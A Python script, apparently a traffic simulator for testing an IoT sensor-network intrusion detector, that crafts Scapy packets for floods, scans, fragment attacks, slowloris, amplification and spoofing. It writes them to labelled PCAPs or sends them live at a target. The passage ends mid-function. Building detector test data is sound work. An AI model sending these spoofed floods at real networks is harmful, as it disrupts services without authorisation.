#!/usr/bin/env python3
"""
IWSN Security — RFC-Compliant Attack Simulator v3.0
Generates synthetic PCAP files for all 21 attack types + MQTT sensor traffic
with ground truth manifest.  Optionally transmits packets live on the wire
via Scapy sendp().

Usage — PCAP mode (default):
  python3 attack_simulator.py --preset all           # Generate all 21 attacks + MQTT + normal
  python3 attack_simulator.py --preset syn_flood      # Single attack
  python3 attack_simulator.py --preset mqtt_traffic   # Just MQTT sensor traffic
  python3 attack_simulator.py --difficulty medium      # Set difficulty level
  python3 attack_simulator.py --list                   # List all presets

Usage — Live transmission mode (requires root + reachable target):
  sudo python3 attack_simulator.py --preset syn_flood --live --iface br0 --target 192.168.1.100
  sudo python3 attack_simulator.py --preset mqtt_traffic --live --iface br0
  sudo python3 attack_simulator.py --preset syn_flood --live --iface br0 --inter 10 --max-pkts 200
  sudo python3 attack_simulator.py --preset all --live --iface br0 --target 192.168.1.100 --max-pkts 300

Live mode notes:
  --inter   Inter-packet gap in milliseconds.  Omit for floods (gap=0).
            Timed attacks (slowloris, RUDY, scans) honour their per-packet
            timestamps automatically when --inter is not set.
  --max-pkts  Per-attack packet cap (default 500).  Use 0 for no cap.
            Caps are applied BEFORE noise injection.
"""

import sys, os, json, time, argparse, random, struct
from pathlib import Path

def _inject_venv_site_packages() -> None:
    """
    When the script is run as `sudo python3`, the active venv is dropped and
    the system Python is used instead.  Detect this by checking whether scapy
    is importable; if not, locate the project venv (../../../.venv relative to
    this script, or any VIRTUAL_ENV env var) and inject its site-packages so
    that all venv-installed packages are reachable.
    """
    try:
        import scapy  # noqa: F401 – already importable, nothing to do
        return
    except ImportError:
        pass

    candidates: list[Path] = []

    # 1) VIRTUAL_ENV env var set by the user before sudo (sudo -E preserves it)
    venv_env = os.environ.get("VIRTUAL_ENV")
    if venv_env:
        candidates.append(Path(venv_env))

    # 2) Walk up from this script to find a .venv directory
    script_dir = Path(__file__).resolve().parent
    for parent in [script_dir, script_dir.parent, script_dir.parent.parent,
                   script_dir.parent.parent.parent]:
        candidates.append(parent / ".venv")

    # 3) SUDO_USER home-relative path (covers most physical deployment layouts)
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        import pwd
        try:
            real_home = Path(pwd.getpwnam(sudo_user).pw_dir)
            candidates.append(real_home / "test" / ".venv")
            candidates.append(real_home / ".venv")
        except KeyError:
            pass

    for venv_path in candidates:
        site_pkgs = sorted(venv_path.glob("lib/python*/site-packages"))
        if site_pkgs:
            sys.path.insert(0, str(site_pkgs[-1]))
            try:
                import scapy  # noqa: F401 – verify it works now
                return
            except ImportError:
                sys.path.pop(0)  # didn't help – try next candidate

    # Nothing worked – fail with a helpful message
    print("[!] Scapy not found in system Python or any detected venv.")
    print("    Either run with the venv Python directly:")
    print("      sudo /home/saad-kashif/test/.venv/bin/python3 scripts/attack_simulator.py --live ...")
    print("    Or preserve the venv when using sudo:")
    print("      sudo -E env PATH=\"$PATH\" python3 scripts/attack_simulator.py --live ...")
    sys.exit(1)

_inject_venv_site_packages()

from scapy.all import (Ether, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR, NTP,  # noqa: E402
                       wrpcap, sendp, conf as scapy_conf,
                       RandShort, RandIP, fragment)

# ────────────────────── CONFIGURATION ──────────────────────

DIFFICULTY_PROFILES = {
    "easy":    {"rate_mult": 2.0, "noise_pct": 0,   "desc": "Textbook attacks, obvious signatures"},
    "medium":  {"rate_mult": 1.0, "noise_pct": 20,  "desc": "Standard rates with some normal traffic"},
    "hard":    {"rate_mult": 0.5, "noise_pct": 50,  "desc": "Low-and-slow with heavy noise mixing"},
    "extreme": {"rate_mult": 0.3, "noise_pct": 70,  "desc": "Evasive, multi-vector, heavily camouflaged"},
}

DEFAULT_TARGET = "192.168.1.100"
DEFAULT_ATTACKER = "10.0.0.50"
MQTT_BROKER = "192.168.1.10"

# ────────────────────── MQTT HELPERS ──────────────────────

def build_mqtt_connect(client_id="iwsn_sensor_01"):
    """Build a raw MQTT CONNECT packet (v3.1.1)."""
    # Variable header: Protocol Name(6) + Level(1) + Flags(1) + KeepAlive(2)
    proto_name = b"\x00\x04MQTT"  # Protocol name
    proto_level = b"\x04"         # MQTT 3.1.1
    connect_flags = b"\x02"       # Clean session
    keep_alive = b"\x00\x3C"      # 60 seconds
    var_header = proto_name + proto_level + connect_flags + keep_alive
    # Payload: Client ID
    cid = client_id.encode()
    payload = struct.pack(">H", len(cid)) + cid
    remaining = var_header + payload
    # Fixed header: type=1 (CONNECT), remaining length
    pkt_type = 0x10
    rem_len = len(remaining)
    fixed = bytes([pkt_type, rem_len])
    return fixed + remaining

def build_mqtt_connack():
    """Build a raw MQTT CONNACK packet."""
    return b"\x20\x02\x00\x00"  # CONNACK, len=2, no session, accepted

def build_mqtt_publish(topic, payload_str, qos=0):
    """Build a raw MQTT PUBLISH packet."""
    topic_bytes = topic.encode()
    payload_bytes = payload_str.encode()
    var_header = struct.pack(">H", len(topic_bytes)) + topic_bytes
    if qos > 0:
        var_header += struct.pack(">H", random.randint(1, 65535))  # Packet ID
    remaining = var_header + payload_bytes
    flags = 0x30 | ((qos & 0x03) << 1)  # PUBLISH + QoS
    rem_len = len(remaining)
    fixed = bytes([flags, rem_len])
    return fixed + remaining

def build_mqtt_subscribe(topic, qos=0):
    """Build a raw MQTT SUBSCRIBE packet."""
    topic_bytes = topic.encode()
    pkt_id = struct.pack(">H", random.randint(1, 65535))
    topic_filter = struct.pack(">H", len(topic_bytes)) + topic_bytes + bytes([qos])
    remaining = pkt_id + topic_filter
    fixed = bytes([0x82, len(remaining)])  # SUBSCRIBE = 0x82
    return fixed + remaining

def build_mqtt_suback(pkt_id=1):
    """Build a raw MQTT SUBACK packet."""
    return b"\x90\x03" + struct.pack(">H", pkt_id) + b"\x00"

def build_mqtt_pingreq():
    """Build MQTT PINGREQ."""
    return b"\xC0\x00"

def build_mqtt_pingresp():
    """Build MQTT PINGRESP."""
    return b"\xD0\x00"

def build_mqtt_disconnect():
    """Build MQTT DISCONNECT."""
    return b"\xE0\x00"

# ────────────────────── NORMAL + MQTT TRAFFIC HELPERS ──────────────────────

IWSN_TOPICS = [
    "sensors/temperature/node1",
    "sensors/temperature/node2",
    "sensors/humidity/node1",
    "sensors/humidity/node2",
    "sensors/pressure/node1",
    "sensors/light/node1",
    "sensors/motion/node1",
    "sensors/battery/node1",
    "sensors/battery/node2",
    "actuators/valve/node1",
    "actuators/relay/node1",
    "network/status/gateway",
]

IWSN_SENSOR_READINGS = {
    "temperature": lambda: {"value": round(random.uniform(18.0, 35.0), 2), "unit": "C"},
    "humidity":    lambda: {"value": round(random.uniform(30.0, 90.0), 1), "unit": "%"},
    "pressure":    lambda: {"value": round(random.uniform(990.0, 1030.0), 1), "unit": "hPa"},
    "light":       lambda: {"value": random.randint(0, 1023), "unit": "lux"},
    "motion":      lambda: {"value": random.choice([0, 1]), "unit": "bool"},
    "battery":     lambda: {"value": round(random.uniform(2.8, 4.2), 2), "unit": "V"},
    "valve":       lambda: {"value": random.choice(["open", "closed"]), "unit": "state"},
    "relay":       lambda: {"value": random.choice([0, 1]), "unit": "bool"},
    "status":      lambda: {"value": "online", "uptime": random.randint(100, 86400), "unit": "s"},
}

def get_sensor_payload(topic):
    """Generate a realistic JSON payload for the given IWSN topic."""
    for stype, gen_fn in IWSN_SENSOR_READINGS.items():
        if stype in topic:
            reading = gen_fn()
            return json.dumps(reading)
    return json.dumps({"value": random.randint(0, 100), "unit": "raw"})

def gen_normal_packets(count=50):
    """Generate normal background traffic (HTTP, DNS, MQTT, ICMP)."""
    pkts = []
    for i in range(count):
        src = f"192.168.1.{random.randint(2,254)}"
        dst = f"192.168.1.{random.randint(2,254)}"
        r = random.random()
        if r < 0.25:
            # Normal Web Traffic
            pkts.append(Ether()/IP(src=src, dst=dst)/TCP(sport=RandShort(), dport=80, flags="S"))
        elif r < 0.45:
            # Normal DNS
            pkts.append(Ether()/IP(src=src, dst=dst)/UDP(sport=RandShort(), dport=53)/Raw(b"\x00\x01dns"))
        elif r < 0.80:
            # Normal MQTT PUBLISH (IWSN sensor data)
            topic = random.choice(IWSN_TOPICS)
            payload_str = get_sensor_payload(topic)
            mqtt_data = build_mqtt_publish(topic, payload_str)
            pkts.append(Ether()/IP(src=src, dst=MQTT_BROKER)/TCP(sport=RandShort(), dport=1883, flags="PA")/Raw(mqtt_data))
        else:
            pkts.append(Ether()/IP(src=src, dst=dst)/ICMP())
    return pkts

def mix_noise(attack_pkts, noise_pct):
    """Interleave normal traffic into attack packets."""
    if noise_pct <= 0:
        return attack_pkts
    noise_count = int(len(attack_pkts) * noise_pct / 100)
    noise = gen_normal_packets(noise_count)
    combined = attack_pkts + noise
    random.shuffle(combined)
    return combined

def spread_packet_times(pkts, duration_seconds, jitter=0.0):
    """Spread packet timestamps across a duration to satisfy time-window detectors."""
    if not pkts:
        return pkts
    start = time.time()
    count = len(pkts)
    step = duration_seconds / max(1, count - 1)
    for i, p in enumerate(pkts):
        delta = (random.uniform(-jitter, jitter) if jitter > 0 else 0.0)
        p.time = start + (i * step) + delta
    return pkts

def save_attack(pkts, name, output_dir, manifest, noise_pct, attack_type, rfc_ref, pkt_count):
    """Save PCAP and record in manifest."""
    pkts = mix_noise(pkts, noise_pct)
    filepath = os.path.join(output_dir, f"{name}.pcap")
    wrpcap(filepath, pkts)
    fsz = os.path.getsize(filepath)
    mqtt_count = sum(1 for p in pkts if p.haslayer(TCP) and (p[TCP].dport == 1883 or p[TCP].sport == 1883))
    manifest["attacks"].append({
        "name": name,
        "file": filepath,
        "attack_type": attack_type,
        "rfc_reference": rfc_ref,
        "attack_packets": pkt_count,
        "total_packets": len(pkts),
        "mqtt_packets": mqtt_count,
        "noise_packets": len(pkts) - pkt_count,
        "file_size_bytes": fsz,
        "expected_detection": attack_type != "None" and attack_type != "MQTT Traffic"
    })
    mqtt_info = f", {mqtt_count} MQTT" if mqtt_count > 0 else ""
    print(f"  ✓ {name}.pcap — {len(pkts)} pkts ({pkt_count} attack + {len(pkts)-pkt_count} noise{mqtt_info}), {fsz/1024:.1f} KB")


def send_live(pkts: list, name: str, iface: str, inter_s: float | None) -> None:
    """
    Transmit *pkts* live on the wire via Scapy sendp().

    Two send strategies are selected automatically:

    • Timed mode  — used when packets carry pre-set .time attributes
      (produced by spread_packet_times for slowloris / RUDY / scan
      generators) AND --inter was not specified.  Each packet is held
      until its scheduled offset from the first packet time fires,
      preserving realistic inter-arrival patterns.

    • Flood mode  — used for all other attacks.  Packets are sent as
      fast as possible (inter_s=0) or at the rate set by --inter.
    """
    if not pkts:
        print(f"  [!] {name}: no packets to send")
        return

    # Detect whether all packets carry timestamps from spread_packet_times.
    # Those packets have a .time > 0 set explicitly; freshly built Scapy
    # packets start with time=0.0 by default.
    first_ts = float(getattr(pkts[0], 'time', 0.0))
    use_timing = (inter_s is None) and (first_ts > 0.0)

    total = len(pkts)

    try:
        if use_timing:
            # ── Timed send: honour per-packet scheduled offsets ──────────────
            t0_pkt = min(float(p.time) for p in pkts)
            t_wall = time.time()
            sent = 0
            for pkt in pkts:
                sched_offset = float(pkt.time) - t0_pkt
                elapsed = time.time() - t_wall
                gap = sched_offset - elapsed
                if gap > 0:
                    time.sleep(gap)
                sendp(pkt, iface=iface, verbose=0)
                sent += 1
                if sent % 10 == 0 or sent == total:
                    print(f"    [{name}] {sent}/{total} pkts sent (timed)", end='\r', flush=True)
            print(f"  ✓ {name} — {sent} pkts sent live (timed, iface={iface})          ")
        else:
            # ── Flood send: send one-by-one so Ctrl+C is honoured ────────────
            gap = inter_s if inter_s is not None else 0.0
            sent = 0
            for pkt in pkts:
                sendp(pkt, iface=iface, verbose=0)
                sent += 1
                if gap > 0:
                    time.sleep(gap)
                if sent % 50 == 0 or sent == total:
                    print(f"    [{name}] {sent}/{total} pkts sent (flood)", end='\r', flush=True)
            rate_str = f"{gap*1000:.1f} ms" if gap > 0 else "max rate"
            print(f"  ✓ {name} — {sent} pkts sent live (inter={rate_str}, iface={iface})")
    except KeyboardInterrupt:
        print(f"\n  [!] {name} — interrupted by user after {sent} pkts")

# ────────────────────── ATTACK GENERATORS ──────────────────────

def gen_syn_flood(n=2000, target=DEFAULT_TARGET):
    """RFC 4987: SYN flood — mass SYN without completing handshake.

    Threshold: syn_rate > 20 SYN/s AND half_open >= 5 (per-flow),
    OR flow_count > 100 unique sources (aggregate path).
    Strategy: 2000 unique source IPs each sending one SYN → 2000 distinct
    flows all targeting the same dst → aggregate detector fires
    (flow_count 2000 >> 100).  All SYNs with no SYN-ACK or ACK replies,
    so every half_open calculation = 100% unanswered.
    """
    pkts = []
    for i in range(n):
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        # Random destination port: aggregate flood detector groups by dst_ip only,
        # so varying dport still maps to the same aggregate target bucket.
        dport = random.choice([80, 443, 8080, 22, 25, 3306, 5432, 8443])
        pkts.append(Ether()/IP(src=src, dst=target)/TCP(sport=RandShort(), dport=dport, flags="S", seq=i*1000))
    return pkts

def gen_udp_flood(n=3000, target=DEFAULT_TARGET):
    """RFC 768/4732: UDP volumetric flood.

    Thresholds: rate > 50 pps AND total > 100 packets AND unique_dst_port_count > 5
    (per-flow), OR flow_count > 100 sources (aggregate path).

    Critical fix: the old generator sent ALL packets to dport=53, giving
    unique_dst_port_count=1 per flow, which permanently blocked per-flow
    detection.  Use random high ports so each flow's unique_dst_port_count
    grows past the port-diversity guard of >5.

    Aggregate path also fires: 3000 unique source IPs → 3000 flows all
    targeting the same dst IP → flow_count 3000 >> 100 threshold.
    """
    pkts = []
    # Use a pool of varied destination ports so unique_dst_port_count > 5
    dst_ports = list(range(1024, 1030)) + [53, 123, 161, 514, 1900]
    for i in range(n):
        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        dport = dst_ports[i % len(dst_ports)]
        pkts.append(Ether()/IP(src=src, dst=target)/UDP(sport=RandShort(), dport=dport)/Raw(b"A"*64))
    return pkts

def gen_icmp_flood(n=2000, target=DEFAULT_TARGET):
    """RFC 792/4732: ICMP echo request flood.

    Thresholds: rate > 15 pps AND total >= 10 (per-flow),
    OR flow_count > 100 sources (aggregate path).

    Strategy: 2000 unique source IPs each sending one ICMP echo → 2000 flows,
    all to the same dst → aggregate detector fires (flow_count 2000 >> 100).
    """
    return [Ether()/IP(src=f"10.{i//65025%256}.{(i//255)%256}.{i%255+1}", dst=target)/ICMP(type=8, id=i % 65535, seq=i % 65535) for i in range(n)]

def gen_http_flood(n=300, target=DEFAULT_TARGET):
    """RFC 9110: HTTP GET request flood.

    Thresholds: rate > 30 req/s AND total >= 5 (per-flow),
    OR flow_count > 100 sources (aggregate path).

    300 unique source IPs → 300 flows to port 80 → aggregate detector fires
    (flow_count 300 >> 100, dst_port=80 matches HTTP aggregate check).
    """
    pkts = []
    for i in range(n):
        src = f"10.{(i // 254) + 1}.{i % 254 + 1}.{random.randint(1, 254)}"
        sp = 1024 + (i % 60000)
        pkts.append(Ether()/IP(src=src, dst=target)/TCP(sport=sp, dport=80, flags="PA")/Raw(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n"))
    return pkts

def gen_ping_of_death(n=20, target=DEFAULT_TARGET):
    """RFC 791 §3.2: ICMP packet with IP total-length field set to 65535.

    Threshold: flow->max_packet_size >= 65535 (pod_packet_size).
    The DPI engine reads max_packet_size from ntohs(ip->tot_len) per
    packet.  We set IP(len=65535) explicitly so the IP header field
    carries 65535 — the RFC 791 §3.2 maximum — regardless of actual
    payload size.  sendp() transmits the raw Ethernet frame as-is;
    the kernel IP stack is bypassed so the oversized len value reaches
    the wire and is captured by the DPI engine.

    DO NOT use Scapy fragment(): that splits into small fragments each
    with their own smaller tot_len, so max_packet_size never reaches
    65535 and the detector never fires.
    """
    pkts = []
    for _ in range(n):
        # IP.len=65535 is set explicitly; Scapy will not auto-calculate
        # because we override it.  The actual payload is small but the
        # IP header announces 65535 bytes — the detector checks that field.
        p = Ether()/IP(src=DEFAULT_ATTACKER, dst=target,
                       id=random.randint(1, 65535), len=65535)/ICMP()/Raw(b"X"*28)
        pkts.append(p)
    return pkts

def gen_land_attack(n=10, target=DEFAULT_TARGET):
    """RFC 6274/CVE-1999-0016: src==dst IP and port.

    Detector: deterministic — fires when src_ip == dst_ip AND src_port ==
    dst_port in the same TCP packet.  No threshold or rate needed.
    First packet immediately triggers detection.
    """
    return [Ether()/IP(src=target, dst=target)/TCP(sport=4444, dport=4444, flags="S") for _ in range(n)]

def gen_smurf(n=500, target=DEFAULT_TARGET):
    """BCP 38: ICMP echo to broadcast with spoofed source.

    Threshold: ICMP rate > 10 pps to a broadcast address (last octet == 0xFF
    or 255.255.255.255).  500 packets from one source IP to broadcast in a
    short window: rate = 500/0.1 = 5000 pps >> 10 threshold.
    All from same source → single ICMP flow, rate easily exceeds threshold.
    """
    bcast = "192.168.1.255"
    return [Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=target, dst=bcast)/ICMP(type=8, id=i % 65535, seq=i % 65535) for i in range(n)]

def gen_fraggle(n=500, target=DEFAULT_TARGET):
    """RFC 6274: UDP to broadcast echo/chargen ports.

    Threshold: (rate > 15 pps OR total > 10 packets) AND dst is broadcast
    AND dport is 7 (echo) or 19 (chargen).  500 packets >> 10 threshold.
    Must be directed to a broadcast address and exclusively to port 7 or 19
    (non-echo-chargen broadcast UDP now guarded against as false positive).
    """
    bcast = "192.168.1.255"
    pkts = []
    for i in range(n):
        port = 7 if i % 2 == 0 else 19
        pkts.append(Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=target, dst=bcast)/UDP(sport=RandShort(), dport=port)/Raw(b"echo"))
    return pkts

def gen_teardrop(n=50, target=DEFAULT_TARGET):
    """RFC 791 §3.2: Overlapping IP fragments causing reassembly crash.

    Detector heuristic: min_packet_size < 60, max_packet_size < 100,
    total_packets > 2 — all fragments are anomalously small.

    Strategy: craft three tiny overlapping fragments per iteration using
    Scapy's IP fragment fields.  Each fragment has IP.len set explicitly
    to 28 bytes (20-byte header + 8-byte payload) which is valid but
    very small.  The DPI engine reads ntohs(ip->tot_len) = 28 for
    packet_size, so min=max=28 < 60 < 100 and total > 2 → detector fires.

    Fragment 1: offset=0, MF=1 (more fragments follow)
    Fragment 2: offset=1 (8-byte units = 8 bytes), MF=1  ← OVERLAPS frag 1
    Fragment 3: offset=1, MF=0 (last fragment)           ← OVERLAPS frag 1+2

    All three are distinct 28-byte IP datagrams (well below both thresholds).
    """
    pkts = []
    for i in range(n):
        frag_id = (0x1234 + i) & 0xFFFF
        # Fragment 1: first fragment, more-fragments bit set, tiny payload
        p1 = Ether()/IP(src=DEFAULT_ATTACKER, dst=target,
                        id=frag_id, flags="MF", frag=0, proto=17,
                        len=28)/Raw(b"\x00"*8)
        # Fragment 2: overlapping (offset=1 in 8-byte units = byte 8, which
        # is within fragment 1's 8-byte data range → overlap)
        p2 = Ether()/IP(src=DEFAULT_ATTACKER, dst=target,
                        id=frag_id, flags="MF", frag=1, proto=17,
                        len=28)/Raw(b"\x00"*8)
        # Fragment 3: last fragment, same overlap as fragment 2
        p3 = Ether()/IP(src=DEFAULT_ATTACKER, dst=target,
                        id=frag_id, flags=0, frag=1, proto=17,
                        len=28)/Raw(b"\x00"*8)
        pkts.extend([p1, p2, p3])
    return pkts

def gen_syn_scan(n=15, target=DEFAULT_TARGET):
    """RFC 793: SYN scan — SYN to many ports, RST on response.

    Aggregate scan detector threshold: port_count >= 10 unique ports
    (scans[i].port_count) from same src→dst pair.
    Per-flow detector: unique_dst_port_count >= 8 (port_scan_unique_ports),
    but since each (sport=54321, dport=X) creates a separate flow the
    per-flow path never fires for a scan.  The aggregate path is the
    authoritative detector — requires >= 10 unique dest ports.
    Use n >= 15 to be comfortably above the 10-port aggregate threshold.
    """
    pkts = []
    for port in range(1, n+1):
        pkts.append(Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=port, flags="S"))
        pkts.append(Ether()/IP(src=target, dst=DEFAULT_ATTACKER)/TCP(sport=port, dport=54321, flags="R"))
    return spread_packet_times(pkts, duration_seconds=20, jitter=0.02)

def gen_connect_scan(n=15, target=DEFAULT_TARGET):
    """RFC 793: Full TCP connect scan — complete handshake then RST.

    Aggregate scan detector: port_count >= 10 (from distinct flows in
    scans[] aggregation grouped by src→dst).  Fires when SYN+ACK counts
    show connect-scan completion pattern (ack_count > syn_count/2).
    Use n >= 15 to be above the 10-port aggregate threshold.
    """
    pkts = []
    for port in range(1, n+1):
        pkts.extend([
            Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=port, flags="S"),
            Ether()/IP(src=target, dst=DEFAULT_ATTACKER)/TCP(sport=port, dport=54321, flags="SA"),
            Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=port, flags="A"),
            Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=port, flags="R"),
        ])
    return spread_packet_times(pkts, duration_seconds=24, jitter=0.02)

def gen_udp_scan(n=60, target=DEFAULT_TARGET):
    """RFC 768: UDP scan — small probes to many ports.

    Aggregate scan detector: port_count >= 10 unique ports from same src→dst.
    60 distinct destination ports (flows) from one attacker IP → port_count
    60 >> 10 threshold.  Each packet is < 100 bytes (2 byte payload).
    """
    return [Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/UDP(sport=54321, dport=p)/Raw(b"pr") for p in range(1, n+1)]

def gen_xmas_scan(n=50, target=DEFAULT_TARGET):
    """RFC 793 §3.9: FIN+PSH+URG flags set.

    Aggregate scan detector path: port_count >= 10 unique ports, fin_count > 0,
    syn_count == 0, ack_count == 0 → classified as FIN/Xmas scan.
    stealth_scan_port_threshold = 3 applies to per-flow detector, but per-flow
    fires on flow->unique_dst_port_count which is 1 per flow here.
    50 ports >> 10 aggregate threshold.
    """
    return [Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=p, flags="FPU") for p in range(1, n+1)]

def gen_null_scan(n=50, target=DEFAULT_TARGET):
    """RFC 793 §3.9: No TCP flags set.

    Aggregate scan: port_count >= 10, has_flags_zero > flow_count/2 → NULL scan.
    50 ports >> 10 aggregate threshold.  All packets have zero flags → all
    flows contribute to has_flags_zero counter.
    """
    return [Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=p, flags=0) for p in range(1, n+1)]

def gen_fin_scan(n=50, target=DEFAULT_TARGET):
    """RFC 793 §3.9: Only FIN flag set.

    Aggregate scan: port_count >= 10, fin_count > 0, syn_count == 0,
    ack_count == 0 → FIN scan classification. 50 ports >> 10 threshold.
    """
    return [Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=p, flags="F") for p in range(1, n+1)]

def gen_rudy(n=30, target=DEFAULT_TARGET):
    """RFC 9110: Slow POST — send body at <10 bytes/sec.

    Thresholds: avg_rate < 10 B/s AND duration > 30s AND total >= 10 packets
    AND established_connections > 0 (completed handshake in flow).

    NOTE: established_connections is incremented when the flow tracker sees
    a SYN-ACK (server reply) followed by ACK (completion).  The PCAP must
    include the full three-way handshake: SYN → SYN-ACK → ACK.
    We include all three handshake packets with the same (src, sport, dst,
    dport) 5-tuple so they land in the same bidirectional flow, giving
    established_connections = 1.
    """
    pkts = []
    sp = 12345
    # Three-way handshake — all must be in the same bidirectional flow
    pkts.append(Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=sp, dport=80, flags="S",  seq=1000))
    pkts.append(Ether()/IP(src=target, dst=DEFAULT_ATTACKER)/TCP(sport=80,  dport=sp, flags="SA", seq=2000, ack=1001))
    pkts.append(Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=sp, dport=80, flags="A",  seq=1001, ack=2001))
    # POST header — declares large Content-Length to keep connection open
    post = "POST /form HTTP/1.1\r\nHost: target\r\nContent-Length: 3000\r\n\r\n"
    pkts.append(Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=sp, dport=80, flags="PA", seq=1001)/Raw(post.encode()))
    # Slow body — 1 byte per packet, spread over 240 s → avg rate << 10 B/s
    for i in range(n):
        pkts.append(Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=sp, dport=80, flags="PA")/Raw(b"A"))
    return spread_packet_times(pkts, duration_seconds=240, jitter=0.1)

def gen_slowloris(n=20, target=DEFAULT_TARGET):
    """RFC 9110: Slow HTTP headers — keep sending partial headers.

    Thresholds: avg_rate < 5 B/s AND pkt_rate < 2.0 pps AND duration > 30s
    AND total_packets >= 5 AND established_connections >= 5.

    n = 20 connections: each must complete the TCP three-way handshake so
    that established_connections is incremented by the flow tracker.
    All 20 connections share the same source IP (DEFAULT_ATTACKER) and
    destination, but different source ports → each lands in its own
    bidirectional flow.  The detector looks at ONE aggregated flow by
    (src_ip, dst_ip) where established_connections accumulates across
    all subflows — so 20 completed handshakes → established_connections 20
    >> threshold of 5.

    Each connection: SYN → SYN-ACK → ACK (handshake), then a trickle of
    partial HTTP headers spread across 120 seconds.
    """
    pkts = []
    start = time.time()
    for conn in range(n):
        sp = 20000 + conn
        # Full three-way handshake to satisfy established_connections check
        h_syn  = Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=sp, dport=80, flags="S",  seq=conn*1000)
        h_sa   = Ether()/IP(src=target, dst=DEFAULT_ATTACKER)/TCP(sport=80, dport=sp,  flags="SA", seq=conn*2000, ack=conn*1000+1)
        h_ack  = Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=sp, dport=80, flags="A",  seq=conn*1000+1, ack=conn*2000+1)
        for pkt, t in [(h_syn, 0.0), (h_sa, 0.05), (h_ack, 0.1)]:
            pkt.time = start + t + (conn * 0.01)
            pkts.append(pkt)
        # Partial header trickle: spread across 120 s per connection
        header_timeline = [2, 30, 60, 90, 120]
        header_payloads = [
            b"GET / HTTP/1.1\r\n",
            b"Host: target\r\n",
            b"User-Agent: slow\r\n",
            b"X-a: 1\r\n",
            b"X-b: 1\r\n",
        ]
        for idx, payload in enumerate(header_payloads):
            pkt = Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=sp, dport=80, flags="PA")/Raw(payload)
            pkt.time = start + header_timeline[idx] + (conn * 0.01)
            pkts.append(pkt)
    return pkts

def gen_dns_amplification(n=200, target=DEFAULT_TARGET):
    """RFC 5358: Large DNS responses from port 53.

    Thresholds (per-flow): avg response size > 512 bytes AND rate > 5/s.
    Thresholds (aggregate): flow_count > 50 AND avg_sz > 200 AND common
    src_port == 53.  200 unique source IPs → 200 flows from port 53 with
    600-byte payloads → aggregate fires (200 flows > 50, avg_sz 614 > 200).
    Per-flow: each source has 1 packet, rate = 1/0.1 = 10 > 5 AND avg_sz
    614 > 512 → per-flow also fires.
    """
    pkts = []
    for i in range(n):
        src = f"8.{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkts.append(Ether()/IP(src=src, dst=target)/UDP(sport=53, dport=RandShort())/Raw(b"D"*600))
    return pkts

def gen_ntp_amplification(n=200, target=DEFAULT_TARGET):
    """CVE-2013-5211: Large NTP monlist responses from port 123.

    Thresholds (per-flow): avg response size > 468 bytes AND rate > 5/s.
    Thresholds (aggregate): flow_count > 50 AND avg_sz > 200 AND common
    src_port == 123.  200 unique NTP server IPs → 200 flows from port 123
    with 500-byte payloads → aggregate fires (200 > 50, avg_sz 514 > 200).
    Per-flow: rate 10/s > 5 AND avg_sz 514 > 468 → per-flow also fires.
    """
    pkts = []
    for i in range(n):
        src = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkts.append(Ether()/IP(src=src, dst=target)/UDP(sport=123, dport=RandShort())/Raw(b"N"*500))
    return pkts

def gen_arp_spoofing(n=30, target=DEFAULT_TARGET):
    """RFC 826/5227: Multiple MACs for same IP.

    Threshold: mac_address_count >= 6 (arp_spoofing_mac_changes) for the
    attacker's source IP within the ip_statistics table.

    The rule engine tracks MAC addresses via update_ip_statistics() which
    reads packet->layer2.src_mac.  Each packet from a different Ethernet
    source MAC but same IP (DEFAULT_ATTACKER) adds a new entry.
    After 6 distinct MACs the threshold is reached.

    n=30 gives 30 unique MACs (capped at 10 stored, threshold=6 → fires
    at the 6th packet, well within 30 attempts).
    Use real UDP traffic so the IP is parsed and ip_statistics are updated.
    """
    pkts = []
    for i in range(n):
        mac = f"aa:bb:cc:dd:ee:{i % 256:02x}"
        pkts.append(Ether(src=mac)/IP(src=DEFAULT_ATTACKER, dst=target)/UDP(sport=RandShort(), dport=9999)/Raw(b"arp-spoof-probe"))
    return pkts

def gen_ip_spoofing(n=50, target=DEFAULT_TARGET):
    """BCP 38: Packets with impossible source addresses.

    Detector (RFC 2827/BCP 38): deterministic check on src IP — fires
    immediately on first packet with a forbidden source address.
    Forbidden ranges checked:
      0.0.0.0 (THIS-HOST, RFC 1122)
      255.255.255.255 (limited broadcast, RFC 919)
      224.x.x.x (multicast, RFC 1112)
      127.x.x.x (loopback, RFC 5735) — only when dst != src
      192.0.2.x (TEST-NET-1, RFC 5737)
      198.51.100.x (TEST-NET-2, RFC 5737)
      240.x.x.x (reserved, RFC 6890)
    Each packet independently triggers detection — no rate or count needed.
    """
    pkts = []
    bad_srcs = [
        "0.0.0.0",          # THIS-HOST (RFC 1122)
        "255.255.255.255",  # limited broadcast (RFC 919)
        "224.0.0.1",        # multicast (RFC 1112)
        "127.0.0.1",        # loopback (RFC 5735)
        "192.0.2.1",        # TEST-NET-1 (RFC 5737)
        "198.51.100.1",     # TEST-NET-2 (RFC 5737)
        "203.0.113.1",      # TEST-NET-3 (RFC 5737)
